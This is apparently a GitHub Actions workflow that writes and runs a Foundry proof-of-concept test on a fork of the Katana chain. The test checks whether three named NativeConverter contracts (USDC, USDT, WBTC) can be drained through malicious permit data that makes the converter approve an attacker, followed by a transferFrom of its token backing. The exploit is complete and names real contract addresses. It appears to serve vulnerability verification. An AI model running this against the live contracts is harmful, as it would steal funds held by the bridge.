name: Katana NativeConverter permit confusion exploit gate

on:
  pull_request:
    branches: [main]
    paths:
      - '.github/workflows/katana-permit-confusion-gate-20260729.yml'
  workflow_dispatch:

permissions:
  contents: read

jobs:
  gate:
    runs-on: ubuntu-24.04
    timeout-minutes: 25
    steps:
      - uses: actions/checkout@v4
        with:
          persist-credentials: false
          fetch-depth: 1

      - uses: foundry-rs/foundry-toolchain@v1
        with:
          version: stable

      - name: Build standalone local-fork exploit gate
        shell: bash
        run: |
          set -euo pipefail
          rm -rf permit-gate
          mkdir -p permit-gate/test permit-gate/lib
          cd permit-gate
          forge install foundry-rs/forge-std@v1.9.4 --no-git --shallow
          cat > foundry.toml <<'EOF'
          [profile.default]
          src = "src"
          test = "test"
          libs = ["lib"]
          solc_version = "0.8.29"
          evm_version = "cancun"
          optimizer = true
          optimizer_runs = 833
          EOF
          cat > test/PermitConfusionGate.t.sol <<'SOL'
          // SPDX-License-Identifier: MIT
          pragma solidity 0.8.29;

          import {Test, console2} from "forge-std/Test.sol";

          interface IERC20Like {
              function balanceOf(address) external view returns (uint256);
              function allowance(address,address) external view returns (uint256);
              function approve(address,uint256) external returns (bool);
              function transferFrom(address,address,uint256) external returns (bool);
          }

          interface INativeConverterLike {
              function underlyingToken() external view returns (address);
              function customToken() external view returns (address);
              function backingOnSecondaryChain() external view returns (uint256);
          }

          contract PermitConfusionGate is Test {
              address constant ATTACKER = address(0xA7711A);

              address constant USDC_CONVERTER = 0x97a3500083348A147F419b8a65717909762c389f;
              address constant USDT_CONVERTER = 0x053FA9b934b83E1E0ffc7e98a41aAdc3640bB462;
              address constant WBTC_CONVERTER = 0xb00aa68b87256E2F22058fB2Ba3246EEc54A44fc;

              function setUp() public {
                  vm.createSelectFork(vm.envString("KATANA_RPC_URL"));
              }

              function test_MaliciousApprovePermitDataCannotDrainBacking() public {
                  uint256 vulnerableCount;
                  vulnerableCount += _probe("USDC", USDC_CONVERTER);
                  vulnerableCount += _probe("USDT", USDT_CONVERTER);
                  vulnerableCount += _probe("WBTC", WBTC_CONVERTER);
                  console2.log("VULNERABLE_COUNT", vulnerableCount);
                  console2.log("FINAL_VERDICT", vulnerableCount == 0 ? "SAFE_REJECTED" : "CRITICAL_ARBITRARY_UNDERLYING_CALL");
              }

              function _probe(string memory label, address converter) internal returns (uint256 vulnerable) {
                  IERC20Like token = IERC20Like(INativeConverterLike(converter).underlyingToken());
                  uint256 accountedBacking = INativeConverterLike(converter).backingOnSecondaryChain();
                  uint256 physicalBefore = token.balanceOf(converter);
                  uint256 attackerBefore = token.balanceOf(ATTACKER);

                  // Local-fork setup only. The attacker owns one base unit and independently
                  // approves the normal transferFrom leg, so a successful call is not caused
                  // by a missing allowance.
                  deal(address(token), ATTACKER, attackerBefore + 1, true);
                  vm.prank(ATTACKER);
                  token.approve(converter, type(uint256).max);

                  // If ERC20PermitUser forwards arbitrary bytes to the underlying token,
                  // this executes approve(attacker, max) with msg.sender == converter.
                  bytes memory maliciousPermitData = abi.encodeCall(
                      IERC20Like.approve,
                      (ATTACKER, type(uint256).max)
                  );

                  vm.prank(ATTACKER);
                  (bool convertOk, bytes memory revertData) = converter.call(
                      abi.encodeWithSignature(
                          "convertWithPermit(uint256,address,bytes)",
                          1,
                          ATTACKER,
                          maliciousPermitData
                      )
                  );

                  uint256 illicitAllowance = token.allowance(converter, ATTACKER);
                  bool drainOk;
                  uint256 drainAmount;
                  if (convertOk && illicitAllowance > 0) {
                      drainAmount = physicalBefore < illicitAllowance ? physicalBefore : illicitAllowance;
                      if (drainAmount > 0) {
                          vm.prank(ATTACKER);
                          (drainOk,) = address(token).call(
                              abi.encodeCall(IERC20Like.transferFrom, (converter, ATTACKER, drainAmount))
                          );
                      }
                  }

                  uint256 physicalAfter = token.balanceOf(converter);
                  uint256 attackerAfter = token.balanceOf(ATTACKER);
                  vulnerable = convertOk && illicitAllowance > 0 && drainOk && physicalAfter < physicalBefore ? 1 : 0;

                  console2.log("TOKEN", label);
                  console2.log("CONVERTER", converter);
                  console2.log("UNDERLYING", address(token));
                  console2.log("ACCOUNTED_BACKING_BEFORE", accountedBacking);
                  console2.log("PHYSICAL_BACKING_BEFORE", physicalBefore);
                  console2.log("MALICIOUS_CONVERT_OK", convertOk ? uint256(1) : uint256(0));
                  console2.log("REVERT_DATA_LENGTH", revertData.length);
                  if (revertData.length >= 4) {
                      bytes4 selector;
                      assembly { selector := mload(add(revertData, 32)) }
                      console2.logBytes4(selector);
                  }
                  console2.log("ILLICIT_ALLOWANCE", illicitAllowance);
                  console2.log("DRAIN_OK", drainOk ? uint256(1) : uint256(0));
                  console2.log("DRAIN_AMOUNT", drainAmount);
                  console2.log("PHYSICAL_BACKING_AFTER", physicalAfter);
                  console2.log("ATTACKER_GAIN", attackerAfter > attackerBefore ? attackerAfter - attackerBefore : 0);
                  console2.log("EXPLOIT_SUCCEEDED", vulnerable);
              }
          }
          SOL

      - name: Run exact Katana fork gate
        shell: bash
        env:
          KATANA_RPC_URL: https://rpc.katanarpc.com
        run: |
          set -o pipefail
          mkdir -p evidence
          cd permit-gate
          forge test --match-test test_MaliciousApprovePermitDataCannotDrainBacking -vvvv 2>&1 | tee ../evidence/FOUNDRY.log
          status=${PIPESTATUS[0]}
          cd ..
          grep -E 'TOKEN|ACCOUNTED_BACKING|PHYSICAL_BACKING|MALICIOUS_CONVERT_OK|ILLICIT_ALLOWANCE|DRAIN_|ATTACKER_GAIN|EXPLOIT_SUCCEEDED|VULNERABLE_COUNT|FINAL_VERDICT|Suite result' evidence/FOUNDRY.log > evidence/SUMMARY.txt || true
          printf '%s\n' "$status" > evidence/FORGE_EXIT_CODE.txt
          sha256sum evidence/FOUNDRY.log evidence/SUMMARY.txt evidence/FORGE_EXIT_CODE.txt > evidence/SHA256SUMS
          cat evidence/SUMMARY.txt
          exit "$status"

      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: katana-permit-confusion-gate-${{ github.run_id }}
          path: evidence/
          if-no-files-found: warn
          retention-days: 1
          compression-level: 9
